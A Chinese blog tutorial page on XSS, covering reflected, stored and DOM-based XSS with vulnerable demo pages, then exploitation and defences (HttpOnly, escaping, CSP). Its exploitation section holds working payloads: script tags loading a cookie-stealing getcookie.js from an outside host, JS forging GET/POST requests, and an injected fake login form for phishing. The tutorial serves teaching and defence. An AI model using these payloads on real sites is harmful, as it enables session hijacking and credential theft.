@@ -1,0 +1,448 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="游魂的网络日志">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="//www.shen.ee">
+    <!--SEO-->
+
+    <meta name="keywords" content="前端安全,xss,xss跨站脚本攻击,xss防御,xss原理,xss攻击,cookie劫持" />
+
+
+    <meta name="description" content="什么是XSSXSS（Cross Site Script）攻击是指黑客通过“HTML注入”篡改网页，插入恶意的脚本，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的..." />
+
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+
+    <!--Title-->
+
+
+<title>XSS跨站脚本攻击原理分析与防御 | 游魂的网络日志</title>
+
+
+    <link rel="alternate" href="/atom.xml" title="游魂的网络日志" type="application/atom+xml">
+
+
+    <link rel="icon" href="/favicon.ico">
+
+    
+
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.5.0">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash">
+
+
+
+
+    
+	<div class="hide">
+		<script type="text/javascript">
+			var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+      var cnzz_s_tag = document.createElement('script');
+      cnzz_s_tag.type = 'text/javascript';
+      cnzz_s_tag.async = true;
+      cnzz_s_tag.charset = 'utf-8';
+      cnzz_s_tag.src = cnzz_protocol + 'w.cnzz.com/c.php?id=1272902812&async=1';
+      var root_s = document.getElementsByTagName('script')[0];
+      root_s.parentNode.insertBefore(cnzz_s_tag, root_s);
+		</script>
+	</div>
+
+
+
+
+
+
+    
+
+    <script>
+        (function(){
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') {
+                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            }
+            else {
+                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+            }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script>
+
+</head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+
+<body>
+    <header class="main-header"  style="background-image:url(/./img/banner.jpg)"  >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='Andy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+        	<!--<h2 class="text-hide">游魂的网络日志</h2>-->
+            
+                 <img src="/img/branding.png" alt="游魂的网络日志" class="img-responsive center-block">
+            
+    	</div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                    <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="//www.shen.ee">游魂的网络日志</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/"><i class="fa "></i>首页</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/前端/"><i class="fa "></i>前端</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/后端/"><i class="fa "></i>后端</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/工具/"><i class="fa "></i>工具</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/资源/"><i class="fa "></i>资源</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/archives/"><i class="fa "></i>时间轴</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/about/"><i class="fa "></i>关于我</a>
+                            </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="XSS跨站脚本攻击原理分析与防御">
+            
+	            XSS跨站脚本攻击原理分析与防御
+            
+        </h1>
+        <div class="post-meta">
+    
+        <span class="categories-meta fa-wrap">
+            <i class="fa fa-folder-open-o"></i>
+            <a class="category-link" href="/categories/前端/">前端</a>
+        </span>
+    
+
+    
+        <span class="fa-wrap">
+            <i class="fa fa-tags"></i>
+            <span class="tags-meta">
+                
+                    <a class="tag-link" href="/tags/cookie劫持/">cookie劫持</a> <a class="tag-link" href="/tags/xss/">xss</a> <a class="tag-link" href="/tags/xss原理/">xss原理</a> <a class="tag-link" href="/tags/xss攻击/">xss攻击</a> <a class="tag-link" href="/tags/xss跨站脚本攻击/">xss跨站脚本攻击</a>
+                
+            </span>
+        </span>
+    
+
+    
+        
+        <span class="fa-wrap">
+            <i class="fa fa-clock-o"></i>
+            <span class="date-meta">2022/06/17</span>
+        </span>
+        
+    
+</div>
+            
+            
+    </div>
+    
+    <div class="post-body post-content">
+        <h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p><strong>XSS（Cross Site Script）攻击是指黑客通过“HTML注入”篡改网页，插入恶意的脚本，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</strong></p>
+<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./test.php"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">	    您的姓名</span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> &gt;</span>  </span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"登录"</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220615171210880.png" alt="image-20220615171210880"></p>
+<p>输入一段脚本代码提交，会直接弹出</p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220615165247780.png" alt="image-20220615165247780"></p>
+<p>我们看一下源代码，script脚本被加载到页面中，这显然是有问题的.</p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220615171427021.png" alt="image-20220615171427021"></p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型xss会把用户输入的数据存储在服务器端，这种xss具备很强的稳定性，常见的场景就是，黑客写下一篇包含恶意js脚本的博客，其他用户浏览包含恶意js脚本的博客，会在他们浏览器上执行这段恶意代码。包含恶意js脚本的博客是保存在服务端的，所以这种xss攻击叫做“存储型xss”</p>
+<p><strong>正常输入</strong></p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220615173719232.png" alt="image-20220615173719232"></p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220615173747621.png" alt="image-20220615173747621"></p>
+<p><strong>非人类输入</strong></p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220615173832904.png" alt="image-20220615173832904"></p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220615173849667.png" alt="image-20220615173849667"></p>
+<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>传统类型的XSS漏洞（反射型或存储型）一般出现在服务器端代码中，而DOM XSS是基于DOM文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。XSS代码不需要服务端解析响应的直接参与，触发XSS的是浏览器端的DOM解析。</p>
+<p>例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"t"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"s"</span> <span class="attr">value</span>=<span class="string">"write"</span> <span class="attr">onclick</span>=<span class="string">"test()"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        	<span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).value</span></span><br><span class="line"><span class="javascript">        	<span class="built_in">document</span>.getElementById(<span class="string">"t"</span>).innerHTML = <span class="string">"&lt;a href='"</span>+str+<span class="string">"' &gt;testLink&lt;/a&gt;"</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>点击wirte会有一个超链接，其地址为文本框的内容。</p>
+<p>这里的wirte按钮的onclick事件调用了test()函数。而在test()函数。而在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作html写入到页面中，这就造成了DOM based XSS。</p>
+<p>我们构造一个恶意数据：<code>&#39; onclick=&quot;alert(1)&quot;</code></p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220615175201085.png" alt="image-20220615175201085"></p>
+<p>也可以选择闭合掉标签，并插入一个新的HTML标签</p>
+<p><code>&#39;&gt;&lt;img src=# onerror=alert(/xss1/) /&gt;&lt;&#39;</code></p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220615175708141.png" alt="image-20220615175708141"></p>
+<h2 id="XSS漏洞利用"><a href="#XSS漏洞利用" class="headerlink" title="XSS漏洞利用"></a>XSS漏洞利用</h2><h3 id="Cookie劫持"><a href="#Cookie劫持" class="headerlink" title="Cookie劫持"></a>Cookie劫持</h3><p>常见的XSS漏洞利用方式有Cookie劫持，一般Cookie中保存了用户的登录凭证。如果Cookie泄露，则可以直接登录进用户的账号。</p>
+<ul>
+<li>1.用户登录</li>
+<li>2.攻击者欺骗用户访问带XSS payload的URL</li>
+<li>3.用户请求攻击者的URL</li>
+<li>4.在用户浏览器执行远程js，将cookie发送给攻击者</li>
+<li>5.攻击者利用cookie进入用户账号</li>
+</ul>
+<p>我们可以在最初的反射型例子中输入一段包含远程脚本的代码<code>&lt;script src=&quot;https://liuliang.tk/getcookie.js&quot;&gt;&lt;/script&gt;</code></p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220616102705682.png" alt="image-20220616102705682"></p>
+<p>看下远程服务器响应日志</p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220616102741200.png" alt="image-20220616102741200"></p>
+<h3 id="构造GET与POST请求"><a href="#构造GET与POST请求" class="headerlink" title="构造GET与POST请求"></a>构造GET与POST请求</h3><p>通过js，让浏览器发起GET、POST请求，完成各种操作。</p>
+<ul>
+<li>构造GET请求：通过插入图片，图片的src为GET请求的URL。</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// option.js</span></span><br><span class="line"><span class="keyword">const</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>)</span><br><span class="line">img.src = <span class="string">'https://liuliang.tk/option.php?option=add'</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>构造POST请求：</p>
+<ul>
+<li><p>1.构造form表单，并提交</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// option.js</span></span><br><span class="line"><span class="keyword">const</span> dd = <span class="built_in">document</span>.createElement (<span class="string">"div"</span>)</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(dd)</span><br><span class="line">dd.innerHTML = <span class="string">"&lt;form action='option.php' method='post' id='xssform'&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;input type='text' name='option' value='add'&gt; &lt;/form&gt;"</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"xssform"</span>).submit()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2.使用 ajax 请求</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// option.js</span></span><br><span class="line"><span class="keyword">let</span> ajax = <span class="literal">null</span></span><br><span class="line"><span class="keyword">const</span> url = <span class="string">'https://liuliang.tk/option.php'</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXobject) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> ActiveX0bject (<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alert(<span class="string">"not compatible"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax.open(<span class="string">"post"</span>, url, <span class="literal">true</span>)</span><br><span class="line">ajax.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line">ajax.send(<span class="string">'option=add'</span>)</span><br><span class="line"></span><br><span class="line">ajax.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ajax.redyState == <span class="number">4</span> &amp;&amp; ajax.status == <span class="number">200</span>) &#123;</span><br><span class="line">        alert(<span class="string">"Done"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<p>访问<code>https://liuliang.tk/option.php?xss=&lt;script src=&quot;https://liuliang.tk/option.js&quot;&gt;&lt;/script&gt;</code></p>
+<p><code>option.txt</code>中写入结果</p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220616115727331.png" alt="image-20220616115727331"></p>
+<h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>伪装一个页面</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dd = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>)</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(dd)</span><br><span class="line">dd.innerHTML = <span class="string">"&lt;meta charset='UTF-8'&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;form action='login.php' method='post'&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;li&gt;&lt;label&gt;用户名:&lt;/label&gt;"</span> + <span class="string">"&lt;input type='text' name='username'&gt;&lt;/li&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;li&gt;&lt;label&gt;密码:&lt;/label&gt;"</span> + <span class="string">"&lt;input type= 'password' name='password'&gt;&lt;/li&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;li&gt;&lt;input type='submit' name='login' value='登录'&gt;&lt;/li&gt;&lt;/form&gt;"</span></span><br></pre></td></tr></table></figure>
+<p>注入 xss <code>https://liuliang.tk/login.php?param=&lt;script src=&quot;https://liuliang.tk/login.js&quot;&gt;&lt;/script&gt;</code></p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220616135039587.png" alt="image-20220616135039587"></p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220616135237632.png" alt="image-20220616135237632"></p>
+<h3 id="识别浏览器及插件"><a href="#识别浏览器及插件" class="headerlink" title="识别浏览器及插件"></a>识别浏览器及插件</h3><p>信息收集用户的浏览器版本信息，扩大攻击面。通过js读取浏览器的userAgent对象识别浏览器版本，查询navigator.plugins对象获取插件信息。</p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220616135613416.png" alt="image-20220616135613416"></p>
+<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p><strong>一个cookie的使用过程如下：</strong></p>
+<p><strong>step1: 浏览器向服务器发起请求，这时候没有cookie。</strong></p>
+<p><strong>step2 : 服务器返回时发送set-cookie，向客户端浏览器写入cookie。</strong></p>
+<p><strong>step3: 在该cookie到前期，浏览器访问该域下的所有界面，都将发送该cookie。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&quot;Set-Cookie: Cookie1=test1;&quot;);</span><br><span class="line">    header(&quot;Set-Cookie: Cookie2=test2;httponly&quot;, false);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    alert(document.cookie)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>只有<code>test1</code>被读取到</p>
+<p><img src="https://oss.iyouhun.com/img/md/image-20220616141250020.png" alt="image-20220616141250020"></p>
+<h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>对传入参数进行格式校验，并对特殊字符进行过滤或转义。由于输入数据的使用场景不同，过滤或转义可能会影响实际的业务使用。同时XSS攻击发生的位置并不是参数传入的位置，可能存在遗漏。</p>
+<p>输入检查的代码一定要在服务器端实现，因为如果在客户端使用JavaScript进行输入检查，很容易绕过检查。正常做法是客户端和服务端实现相同的输入检查，客户端可以阻挡大部分错误操作的正常用户，可以节约服务器的资源。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHTML</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">"&amp;amp;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">"&amp;lt;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">"&amp;gt;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/"/g</span>, <span class="string">"&amp;quot;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/'/g</span>, <span class="string">"&amp;#39;"</span>);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>对返回给浏览器的输出结果进行HTML实体化编码。对JavaScript输出的用户可控数据进行转义。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--api.php--&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    @$input = $_GET[&apos;param&apos;];</span><br><span class="line">    echo &quot;&lt;div&gt;.$input.&lt;/div&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;div&gt;&quot;.htmlentities($input).&quot;&lt;/div&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;div&gt;&quot;.htmlspecialchars($input).&quot;&lt;/div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>注：<code>htmlentities</code>不指定编码的话遇到中文会乱码</p>
+<p>在使用 <code>.innerHTML</code>、<code>document.write()</code>、<code>document.outerHTML</code> 这些能够修改页面结构的 API 时要注意防范恶意代码，尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等</p>
+<h3 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a>内容安全策略（CSP）</h3><p><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">内容安全策略（Content Security Policy）</a>，实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，大大增强了网页的安全性。</p>
+<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的 Content-Security-Policy 的字段。</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">script-src</span> <span class="string">'self'</span>; </span><br><span class="line">                         <span class="keyword">object-src</span> <span class="string">'none'</span>;</span><br><span class="line">                         <span class="keyword">style-src</span> cdn.example.org iyouhun.com; </span><br><span class="line">                         <span class="keyword">child-src</span> https:</span><br></pre></td></tr></table></figure>
+<p>另一种是通过网页的 <code>&lt;meta&gt;</code> 标签。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org iyouhun.com; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面代码中，CSP 做了如下配置。</p>
+<ul>
+<li><strong>脚本：</strong> 只信任当前域名</li>
+<li><strong><code>&lt;object&gt;</code>标签：</strong> 不信任任何 URL，即不加载任何资源</li>
+<li><strong>样式表：</strong> 只信任 cdn.example.org 和 iyouhun.com</li>
+<li><strong>页面子内容，如 <code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>：</strong> 必须使用HTTPS协议加载</li>
+<li><strong>其他资源：</strong> 没有限制</li>
+</ul>
+<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>百度网盘：<a href="https://zhuanlan.zhihu.com/p/24249045" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24249045</a></p>
+<p>酷站：<a href="https://www.cnblogs.com/chyingp/archive/2013/06/06/zcool-xss.html" target="_blank" rel="noopener">https://www.cnblogs.com/chyingp/archive/2013/06/06/zcool-xss.html</a></p>
+<h2 id="xss在线攻击小游戏"><a href="#xss在线攻击小游戏" class="headerlink" title="xss在线攻击小游戏"></a>xss在线攻击小游戏</h2><p><a href="https://alf.nu/alert1" target="_blank" rel="noopener">https://alf.nu/alert1</a></p>
+<p><a href="http://prompt.ml/" target="_blank" rel="noopener">http://prompt.ml/</a></p>
+<p><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">https://xss-game.appspot.com/</a></p>
+
+    </div>
+    
+    <div class="post-footer">
+        <div>
+            
+                转载声明：商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="" target="_blank">游魂的网络日志</a>
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+
+<div class="article-nav prev-next-wrap clearfix">
+    
+        <a href="/article/29773.html" class="pre-post btn btn-default" title='Jenkins Publish over SSH 插件配置及服务器互信'>
+            <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+            <span class="hidden-xs">Jenkins Publish over SSH 插件配置及服务器互信</span>
+        </a>
+    
+    
+        <a href="/article/32125.html" class="next-post btn btn-default" title='TypeScript 常用类型'>
+            <span class="hidden-lg">下一篇</span>
+            <span class="hidden-xs">TypeScript 常用类型</span><i class="fa fa-angle-right fa-fw"></i>
+        </a>
+    
+</div>
+
+
+    <div id="comments">
+        
+	<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
